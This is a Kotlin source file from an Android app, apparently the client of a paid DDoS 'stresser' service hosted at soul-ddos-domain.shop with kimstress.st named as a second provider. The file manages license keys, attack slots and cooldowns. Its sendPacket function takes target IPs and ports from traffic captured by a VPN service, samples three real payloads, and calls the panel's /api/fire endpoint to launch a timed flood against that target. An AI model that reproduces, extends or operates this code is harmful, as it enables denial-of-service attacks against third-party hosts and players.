package com.soul.crack.service

import android.content.Context
import android.util.Log
import com.soul.crack.BuildConfig
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import okhttp3.CertificatePinner
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.net.URLEncoder
import java.util.concurrent.TimeUnit

/**
 * SERVER-AUTHORITATIVE SLOT + COOLDOWN SYSTEM (DUAL PROVIDER)
 *
 * option=1 → 1 global slot, max 120s (existing API)
 * option=2 → 4 concurrent slots, max 240s (kimstress.st)
 *
 * The user picks an option in the dashboard; it is persisted per-device
 * and sent as ?option=N on every /api/fire call.
 */
object ApiSender {

    private const val TAG = "ApiSender"
    private const val PREFS = "tc_prefs"
    private const val KEY_TIME = "user_time"
    private const val KEY_OPTION = "user_option"
    private const val POLL_INTERVAL_MS = 5000L

    const val MAX_TIME_OPT1 = 120
    const val MAX_TIME_OPT2 = 240

    // Server-driven state (updated by polling)
    private val _serverSlotBusy = MutableStateFlow(false)
    val slotBusy: StateFlow<Boolean> = _serverSlotBusy.asStateFlow()

    private val _serverSlotRemaining = MutableStateFlow(0)
    val remainingSeconds: StateFlow<Int> = _serverSlotRemaining.asStateFlow()

    private val _serverCooldownSecs = MutableStateFlow(0)
    val cooldownSeconds: StateFlow<Int> = _serverCooldownSecs.asStateFlow()

    private val _isAttacking = MutableStateFlow(false)
    val isAttacking: StateFlow<Boolean> = _isAttacking.asStateFlow()

    private val _firedBy = MutableStateFlow<String?>(null)
    val firedBy: StateFlow<String?> = _firedBy.asStateFlow()

    // Connection error (SSL / network failures) — surfaced to UI as banner
    private val _connectionError = MutableStateFlow<String?>(null)
    val connectionError: StateFlow<String?> = _connectionError.asStateFlow()
    fun clearConnectionError() { _connectionError.value = null }

    // Watchdog: if _isAttacking stays true for >20s with no callback, force-clear
    private var attackWatchdog: kotlinx.coroutines.Job? = null
    private fun armAttackWatchdog() {
        attackWatchdog?.cancel()
        attackWatchdog = pollingScope.launch {
            delay(20_000)
            if (_isAttacking.value) {
                Log.w(TAG, "Attack watchdog tripped — clearing _isAttacking")
                _isAttacking.value = false
            }
        }
    }
    private fun cancelAttackWatchdog() {
        attackWatchdog?.cancel(); attackWatchdog = null
    }

    // Currently selected option (1 or 2) and its slot stats
    private val _selectedOption = MutableStateFlow(1)
    val selectedOption: StateFlow<Int> = _selectedOption.asStateFlow()

    private val _slotsTotal = MutableStateFlow(1)
    val slotsTotal: StateFlow<Int> = _slotsTotal.asStateFlow()

    private val _slotsBusy = MutableStateFlow(0)
    val slotsBusy: StateFlow<Int> = _slotsBusy.asStateFlow()

    // Last fired packet info — used by overlay to show IP/PORT/TIME after fire
    private val _lastFiredIp = MutableStateFlow("")
    val lastFiredIp: StateFlow<String> = _lastFiredIp.asStateFlow()

    private val _lastFiredPort = MutableStateFlow(0)
    val lastFiredPort: StateFlow<Int> = _lastFiredPort.asStateFlow()

    private val _lastFiredTime = MutableStateFlow("")
    val lastFiredTime: StateFlow<String> = _lastFiredTime.asStateFlow()

    // One-shot signal: server accepted the fire — overlay observes to auto-stop+clear
    private val _apiCallSuccess = MutableStateFlow(false)
    val apiCallSuccess: StateFlow<Boolean> = _apiCallSuccess.asStateFlow()

    fun resetApiCallSuccess() { _apiCallSuccess.value = false }

    // Payload sampling — collect the first three real payloads from the current
    // target before firing. New ip:port resets the buffer.
    private val payloadBuffer: MutableList<String> = mutableListOf()
    private var bufferTargetKey: String? = null

    private val pollingScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val client: OkHttpClient by lazy {
        val pinner = CertificatePinner.Builder()
            .add("soul-ddos-domain.shop", BuildConfig.CERT_PIN_PRIMARY)
            .apply {
                if (BuildConfig.CERT_PIN_BACKUP.isNotEmpty())
                    add("soul-ddos-domain.shop", BuildConfig.CERT_PIN_BACKUP)
            }
            .build()
        OkHttpClient.Builder()
            .connectTimeout(8, TimeUnit.SECONDS)
            .readTimeout(12, TimeUnit.SECONDS)
            .writeTimeout(8, TimeUnit.SECONDS)
            .certificatePinner(pinner)
            .build()
    }

    fun startPolling(context: Context) {
        // Hydrate option from prefs once on start
        _selectedOption.value = getOption(context)
        Log.d(TAG, "Starting server polling (every ${POLL_INTERVAL_MS}ms), option=${_selectedOption.value}")
        pollingScope.launch {
            while (true) {
                try { pollOnce(context) }
                catch (e: Exception) { Log.e(TAG, "Poll error: ${e.message}") }
                delay(POLL_INTERVAL_MS)
            }
        }
    }

    private suspend fun pollOnce(context: Context) {
        // Slot status — read from option-specific nested envelope (option1 / option2)
        try {
            val slotResp = getSlotStatus(context)
            if (slotResp != null) {
                val opt = _selectedOption.value
                val envelope = when (opt) {
                    2    -> slotResp.optJSONObject("option2") ?: slotResp
                    else -> slotResp.optJSONObject("option1") ?: slotResp
                }
                val total = if (opt == 2) 4 else 1
                val busyCount = envelope.optInt(
                    "slots_busy",
                    if (envelope.optBoolean("busy", false)) 1 else 0
                )
                val remaining = envelope.optInt("remaining_seconds", 0)
                val firedByKey = envelope.optString("fired_by", null)
                _slotsTotal.value = total
                _slotsBusy.value = busyCount
                _serverSlotBusy.value = busyCount >= total
                _serverSlotRemaining.value = remaining
                _firedBy.value = if (busyCount > 0 && !firedByKey.isNullOrBlank()) firedByKey else null
            }
        } catch (e: Exception) {
            Log.e(TAG, "Slot status poll failed: ${e.message}")
            recordConnectionError(e)
        }

        // User cooldown — accept BOTH `cooldown_remaining` and `cooldown_remaining_seconds`
        try {
            val key = AuthManager.getLicense(context)
            if (!key.isNullOrBlank()) {
                val cooldownResp = getCooldownStatus(context, key)
                if (cooldownResp != null) {
                    val cd = when {
                        cooldownResp.has("cooldown_remaining_seconds") ->
                            cooldownResp.optInt("cooldown_remaining_seconds", 0)
                        cooldownResp.has("cooldown_remaining") ->
                            cooldownResp.optInt("cooldown_remaining", 0)
                        else -> 0
                    }
                    _serverCooldownSecs.value = cd
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Cooldown status poll failed: ${e.message}")
            recordConnectionError(e)
        }
    }

    private fun recordConnectionError(e: Exception) {
        val msg = e.message ?: e.javaClass.simpleName
        val isNetOrSsl = e is javax.net.ssl.SSLException ||
                e is javax.net.ssl.SSLHandshakeException ||
                e is java.net.UnknownHostException ||
                e is java.net.SocketTimeoutException ||
                e is java.net.ConnectException ||
                e is java.io.IOException
        if (isNetOrSsl) _connectionError.value = "${e.javaClass.simpleName}: $msg"
    }

    private suspend fun getSlotStatus(context: Context): JSONObject? {
        return try {
            val key = AuthManager.getLicense(context) ?: "SLOT_CHECK"
            val deviceId = AuthManager.getDeviceId(context)
            val result = PanelApiV4.getSlotStatus(key, deviceId)
            if (result.ok && result.body != null) {
                _connectionError.value = null
                result.body
            } else null
        } catch (e: Exception) {
            Log.e(TAG, "getSlotStatus error: ${e.message}")
            recordConnectionError(e); null
        }
    }

    private suspend fun getCooldownStatus(context: Context, licenseKey: String): JSONObject? {
        return try {
            val deviceId = AuthManager.getDeviceId(context)
            val result = PanelApiV4.getCooldownStatus(licenseKey, deviceId)
            if (result.ok && result.body != null) result.body else null
        } catch (e: Exception) {
            Log.e(TAG, "getCooldownStatus error: ${e.message}")
            recordConnectionError(e); null
        }
    }

    fun sendPacket(
        context: Context,
        ip: String,
        port: Int,
        payload: ByteArray
    ) {
        // Guard: if this user is already firing or in cooldown, skip the round-trip.
        // VpnCaptureService calls this for EVERY captured packet, so without this
        // the server would receive hundreds of /api/fire calls per attack — all
        // rejected with reason:"cooldown" after the first.
        if (_isAttacking.value) return
        if (_serverCooldownSecs.value > 0) return

        // Ignore empty / oversized payloads up front
        if (payload.isEmpty()) return

        val licenseKey = AuthManager.getLicense(context) ?: return
        val time = getTime(context)
        val opt = _selectedOption.value.takeIf { it == 1 || it == 2 } ?: getOption(context)

        if (time.isNullOrBlank() || ip.isBlank() || port <= 0) {
            Log.w(TAG, "sendPacket: invalid params"); return
        }

        // Buffer first 3 real payloads for the current target before firing.
        // Reset the buffer whenever a new ip:port target appears.
        synchronized(payloadBuffer) {
            val targetKey = "$ip:$port"
            if (targetKey != bufferTargetKey) {
                bufferTargetKey = targetKey
                payloadBuffer.clear()
            }
            if (payloadBuffer.size < 3) {
                // Cap each payload sample at 1KB to keep the URL bounded.
                val cap = if (payload.size > 1024) payload.copyOfRange(0, 1024) else payload
                val hex = cap.joinToString("") { "%02X".format(it) }
                payloadBuffer.add(hex)
                Log.d(TAG, "Buffered payload ${payloadBuffer.size}/3 for $targetKey (${cap.size}B)")
            }
            if (payloadBuffer.size < 3) return
        }

        // We have 3 payloads — proceed with fire.
        val p1: String; val p2: String; val p3: String
        synchronized(payloadBuffer) {
            p1 = payloadBuffer.getOrElse(0) { "" }
            p2 = payloadBuffer.getOrElse(1) { "" }
            p3 = payloadBuffer.getOrElse(2) { "" }
            // Clear so a fresh attack collects fresh samples.
            payloadBuffer.clear()
            bufferTargetKey = null
        }

        // Record last-fired info BEFORE building URL — overlay reads these
        _lastFiredIp.value = ip
        _lastFiredPort.value = port
        _lastFiredTime.value = time

        _isAttacking.value = true
        armAttackWatchdog()

        val url = PanelApi.BASE_URL + "/api/fire" +
                "?key=" + URLEncoder.encode(licenseKey, "UTF-8") +
                "&ip=" + URLEncoder.encode(ip, "UTF-8") +
                "&port=" + URLEncoder.encode(port.toString(), "UTF-8") +
                "&time=" + URLEncoder.encode(time, "UTF-8") +
                "&option=" + opt +
                "&payload1=" + URLEncoder.encode(p1, "UTF-8") +
                "&payload2=" + URLEncoder.encode(p2, "UTF-8") +
                "&payload3=" + URLEncoder.encode(p3, "UTF-8")

        Log.d(TAG, "Firing attack: ip=$ip port=$port time=$time option=$opt p1=${p1.length}B p2=${p2.length}B p3=${p3.length}B")

        try {
            val req = Request.Builder().url(url).get().build()
            client.newCall(req).enqueue(object : okhttp3.Callback {
                override fun onFailure(call: okhttp3.Call, e: java.io.IOException) {
                    Log.e(TAG, "Fire request failed: ${e.message}")
                    recordConnectionError(e as Exception)
                    _isAttacking.value = false
                    cancelAttackWatchdog()
                    pollingScope.launch { delay(1000); pollOnce(context) }
                }

                override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                    val text = response.body?.string().orEmpty()
                    Log.d(TAG, "Fire response: $text")
                    response.close()
                    try {
                        val json = JSONObject(text)
                        val ok = json.optBoolean("ok", false)
                        val reason = json.optString("reason", "")
                        if (!ok) {
                            Log.w(TAG, "Fire rejected: $reason")
                            // If the server says we're in cooldown, mirror it so
                            // the local guard kicks in immediately. Accept BOTH names.
                            val cd = when {
                                json.has("cooldown_remaining_seconds") -> json.optInt("cooldown_remaining_seconds", 0)
                                json.has("cooldown_remaining") -> json.optInt("cooldown_remaining", 0)
                                else -> 0
                            }
                            if (cd > 0) _serverCooldownSecs.value = cd
                        } else {
                            Log.i(TAG, "Fire accepted by server (option=$opt)")
                            // Optimistically lock the user out locally for the
                            // attack duration — the real value lands on next poll.
                            val locked = json.optInt("slot_locked_for", 0)
                            if (locked > 0) _serverCooldownSecs.value = locked
                            // Notify overlay (auto-stop + auto-clear)
                            _apiCallSuccess.value = true
                        }
                    } catch (_: Exception) {}
                    _isAttacking.value = false
                    cancelAttackWatchdog()
                    pollingScope.launch { delay(1000); pollOnce(context) }
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "sendPacket exception: ${e.message}")
            recordConnectionError(e)
            _isAttacking.value = false
            cancelAttackWatchdog()
        }
    }

    // ----- Time settings -----
    fun getTime(context: Context): String? {
        val t = context.applicationContext
            .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getString(KEY_TIME, null)
        return if (t.isNullOrBlank()) null else t
    }

    fun setTime(context: Context, time: String) {
        context.applicationContext
            .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().putString(KEY_TIME, time).apply()
    }

    // ----- Option selector -----
    fun getOption(context: Context): Int {
        return context.applicationContext
            .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getInt(KEY_OPTION, 1).coerceIn(1, 2)
    }

    fun setOption(context: Context, option: Int) {
        val opt = if (option == 2) 2 else 1
        context.applicationContext
            .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().putInt(KEY_OPTION, opt).apply()
        _selectedOption.value = opt
        // Re-poll soon so UI reflects the new option's slot stats fast
        pollingScope.launch { delay(150); pollOnce(context) }
    }

    fun maxTimeFor(option: Int): Int = if (option == 2) MAX_TIME_OPT2 else MAX_TIME_OPT1

    fun resetFirst(@Suppress("UNUSED_PARAMETER") context: Context) {}
}